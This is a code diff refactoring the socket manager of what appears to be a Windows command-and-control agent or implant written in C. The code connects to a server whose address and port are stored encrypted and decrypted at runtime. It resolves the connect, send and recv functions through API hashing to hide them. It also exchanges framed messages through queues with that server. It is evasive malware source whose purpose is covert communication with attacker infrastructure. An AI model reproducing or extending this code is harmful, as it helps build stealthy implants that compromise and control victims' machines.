@@ -5,87 +5,35 @@
 #include <stdio.h>
 #include "socketManager.h"
 #include "../message/Message.h"
+#include "../message/MessageQueue.h"
 #include "../Definitions.h"
 #include "../importer/Importer.h"
 #include "../crypto/Crypto.h"
+#include "../memoryCollector/MemoryCollector.h"
 
-MESSAGE INIT_MESSAGE = {
-    .payload = (PBYTE)"INIT",
-    .size = sizeof("INIT"),
-    .type = INIT_TYPE 
-}; 
+SOCKET _initWindowsSocket();
 
-void initSocketManager(PSOCKET_MANAGER pSockManager)
+PSOCKET_MANAGER initSocketManager(PMESSAGE_QUEUE queueMessageReceived, PMESSAGE_QUEUE queueMessagesToSend)
 {
-    /* INITIALIZE WINDOWS SOCKET STRUCTURES*/
-    WSADATA wsaData = {0};
-    int sStartUp = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (sStartUp != 0)
-    {
-        printf("[-] Socket initialization failed -> %i\n", sStartUp);
-        return;
-    }
-
-    /* CREATING A WINDOWS SOCKET */
-    SOCKET sock = INVALID_SOCKET;
-    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET)
-    {
-        printf("[-] Socket creation failed -> 0x%i\n", WSAGetLastError());
-        return;
-    }
-
-    DWORD serverStrLength = frombase64GetLength(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN));
-    PBYTE serverBlob = fromBase64GetBlob(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN), serverStrLength);
-    PCSTR server =  (PCSTR)encrypt(serverBlob, serverStrLength);
-
-    DWORD portStrLength = frombase64GetLength(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER));
-    PBYTE portBlob = fromBase64GetBlob(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER), portStrLength);
-    PCSTR portStr =  (PCSTR)encrypt(portBlob, portStrLength);
-    u_short port = atoi(portStr);
-
-    struct sockaddr_in sockAddr =
-    {
-        .sin_family = AF_INET, 
-        .sin_port = htons(port)
-    };
-
-    if (inet_pton(AF_INET, server, &sockAddr.sin_addr) != 1)
-    {
-        printf("[-] inet_pton failed -> %i\n", WSAGetLastError());
-        return;
-    };
-
-    /* CONNECTION TO THE SERVER */
-
-    /* OBTAIN OBFUSCTED FUNCTION */
-    typedef NTSTATUS(WINAPI* ConnectTominic)(
-		SOCKET      s,
-		const struct sockaddr *name,
-		int         namelen
-	);
-    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_CONNECT_FUNCTION);
-    if (connectToMinic(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
-    {
-        printf("[-] connect failed -> %i\n", WSAGetLastError());
-        return;
-    };
-
+    SOCKET sock = _initWindowsSocket();
     printf("[+] Socket successfully intialized...\n");
-    SOCKET_MANAGER sManager = {
-        .port = port,
-        .server = server,
-        .s = sock
-    };
+    if(sock == INVALID_SOCKET)
+    {
+        return NULL;
+    }
+    PSOCKET_MANAGER sManager = (PSOCKET_MANAGER)allocMemory(sizeof(SOCKET_MANAGER));
+    sManager->s = sock;
+    sManager->queueMessageReceived = queueMessageReceived;
+    sManager->queueMessagesToSend = queueMessagesToSend;
+    return sManager;
+};
 
-    /* SENDING INITIAL MESSAGE TO SERVER */
-    pSockManager = &sManager;
-    sendMessage(pSockManager, &INIT_MESSAGE);
-    MESSAGE message = {0};
-    receiveMessage(pSockManager, &message);
-    DWORD agentId = (message.payload[0] << 24) | (message.payload[1] << 16) | (message.payload[2] << 8) | (message.payload[3]);
-    printf("My agent id is -> %u", agentId);
-}
+BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
+{
+
+    freeMemory(pSockManager);
+    return TRUE;
+};
 
 BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 {
@@ -102,10 +50,9 @@ BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
     ------------------------------------------
                   sizeToAlloc
     */
-    char* data = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeToAlloc);
+    char* data = (char*)allocMemory(sizeToAlloc);
     if (data == NULL)
     {
-        printf("[-] VirtualAlloc failed %li", GetLastError());
         return FALSE;
     }
     
@@ -122,11 +69,12 @@ BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 	);
     SendToMinic sendToMinic =  (SendToMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_SEND_FUNCTION);
     sendToMinic(sManager->s, data, sizeToAlloc, 0);
-    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, data);
+    freeMemory(data);
+    freeMessage(message);
     return TRUE;
-}
+};
 
-void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
+void receiveMessage(PSOCKET_MANAGER sManager)
 {   
     /* OBTAIN OBFUSCTED FUNCTION */
     typedef NTSTATUS(WINAPI* RecvFromMinic)(
@@ -155,19 +103,66 @@ void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 
     /* READING payloadSize BYTES FOR MESSAGE PAYLOAD */
     DWORD payloadSize = (size[0] << 24) | (size[1] << 16) | (size[2] << 8) | (size[3]);
-    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
+    char* buffer = (char*)allocMemory(payloadSize);
     if (recvFromMinic(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
         return;
     };
 
-    message->payload = (PBYTE)buffer;
-    message->size = payloadSize;
-    message->type = responseType;
-}
+    createMessage(responseType, payloadSize, buffer);
 
-BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
-{
-    return TRUE;
 };
+
+SOCKET _initWindowsSocket()
+{
+    /* INITIALIZE WINDOWS SOCKET STRUCTURES*/
+    WSADATA wsaData = {0};
+    int sStartUp = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (sStartUp != 0)
+    {
+        printf("[-] Socket initialization failed -> %i\n", sStartUp);
+        return INVALID_SOCKET;
+    }
+
+    /* CREATING A WINDOWS SOCKET */
+    SOCKET sock = INVALID_SOCKET;
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET)
+    {
+        printf("[-] Socket creation failed -> 0x%i\n", WSAGetLastError());
+        return INVALID_SOCKET;
+    }
+
+    PCSTR server =  (PCSTR)decrypt(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN));
+    PCSTR portStr =  (PCSTR)decrypt(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER));
+    u_short port = atoi(portStr);
+    freeMemory(portStr);
+    
+    struct sockaddr_in sockAddr =
+    {
+        .sin_family = AF_INET, 
+        .sin_port = htons(port)
+    };
+
+    if (inet_pton(AF_INET, server, &sockAddr.sin_addr) != 1)
+    {
+        printf("[-] inet_pton failed -> %i\n", WSAGetLastError());
+        return INVALID_SOCKET;
+    };
+
+    /* OBTAIN OBFUSCTED FUNCTION */
+    typedef NTSTATUS(WINAPI* ConnectTominic)(
+        SOCKET      s,
+        const struct sockaddr *name,
+        int         namelen
+    );
+    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_CONNECT_FUNCTION);
+    if (connectToMinic(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
+    {
+        printf("[-] connect failed -> %i\n", WSAGetLastError());
+        return INVALID_SOCKET;
+    };
+
+    return sock;
+}
